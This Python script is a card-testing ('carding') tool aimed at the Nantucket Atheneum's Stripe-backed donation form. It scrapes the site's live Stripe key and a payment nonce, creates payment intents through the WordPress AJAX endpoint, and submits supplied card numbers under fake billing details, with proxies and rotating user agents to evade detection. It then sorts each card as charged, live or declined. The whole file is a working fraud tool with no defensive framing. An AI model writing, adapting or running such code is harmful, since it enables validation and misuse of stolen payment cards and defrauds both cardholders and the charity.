import requests
import re
import random
import string
import asyncio

def check_card_nantucket_sync(cc, mm, yy, cvc, proxy_url=None):
    """
    Synchronous Nantucket Atheneum (Gravity Forms Stripe PaymentIntent) card check.
    Returns: (status_code, message, brand)
    """
    if len(yy) == 2:
        yy = f"20{yy}"
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    ]
    user = random.choice(user_agents)

    s = requests.Session()
    if proxy_url:
        s.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        # Step 1: GET page to scrape pk_live and create_payment_intent_nonce
        url_page = "https://nantucketatheneum.org/donate/become-a-turkey-plunge-sponsor/"
        headers_page = {"User-Agent": user}
        r_page = s.get(url_page, headers=headers_page, timeout=15)
        
        pk_match = re.search(r'(pk_live_[A-Za-z0-9_-]+)', r_page.text)
        if not pk_match:
            return "error", "Failed to scrape Stripe key", "N/A"
        pk_live = pk_match.group(1)

        nonce_match = re.search(r'"create_payment_intent_nonce":"(.*?)"', r_page.text)
        if not nonce_match:
            return "error", "Failed to scrape payment intent nonce", "N/A"
        nonce = nonce_match.group(1)

        # Step 2: Create PaymentIntent via admin-ajax.php
        url_ajax = "https://nantucketatheneum.org/wp-admin/admin-ajax.php"
        payload_ajax = {
            "action": "gfstripe_elements_create_payment_intent",
            "nonce": nonce,
            "entry_id": "1582",
            "feed_id": "5"
        }
        headers_ajax = {
            "User-Agent": user,
            "Origin": "https://nantucketatheneum.org",
            "Referer": url_page
        }
        r_ajax = s.post(url_ajax, data=payload_ajax, headers=headers_ajax, timeout=15)
        res_ajax = r_ajax.json()
        if not res_ajax.get("success"):
            return "error", "PaymentIntent creation failed", "N/A"

        client_secret = res_ajax["data"]["client_secret"]
        pi_id = client_secret.split("_secret_")[0]

        # Step 3: Confirm PaymentIntent on Stripe API
        url_stripe = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
        name = f"{random.choice(first_names)} {random.choice(last_names)}"

        payload_stripe = {
            "payment_method_data[type]": "card",
            "payment_method_data[billing_details][name]": name,
            "payment_method_data[billing_details][address][line1]": "450 Lexington Ave",
            "payment_method_data[billing_details][address][city]": "New York",
            "payment_method_data[billing_details][address][state]": "New York",
            "payment_method_data[billing_details][address][postal_code]": "10017",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvc,
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[card][exp_year]": yy,
            "use_stripe_sdk": "true",
            "key": pk_live,
            "client_secret": client_secret
        }
        headers_stripe = {
            "User-Agent": user,
            "Accept": "application/json",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/"
        }
        r_stripe = s.post(url_stripe, data=payload_stripe, headers=headers_stripe, timeout=15)
        res_stripe = r_stripe.json()

        st = res_stripe.get("status")
        if st == "succeeded":
            return "charged", "Order Completed / Charged", "Stripe"
        elif st == "requires_action":
            return "3ds", "3D Secure Required", "Stripe"

        error = res_stripe.get("error") or res_stripe.get("last_payment_error") or {}
        msg = error.get("message", "Declined")
        code = error.get("code", "card_declined")
        
        if "insufficient funds" in msg.lower() or "insufficient_funds" in code.lower():
            return "live", "Insufficient Funds", "Stripe"
        elif "incorrect_cvc" in code.lower() or "security code is incorrect" in msg.lower():
            return "live", "Security code is incorrect", "Stripe"
        
        return "declined", msg, "Stripe"

    except Exception as e:
        return "error", str(e), "N/A"

async def check_card_nantucket(cc, mm, yy, cvc, proxy_url=None):
    """
    Async wrapper for check_card_nantucket_sync.
    """
    return await asyncio.to_thread(check_card_nantucket_sync, cc, mm, yy, cvc, proxy_url=proxy_url)
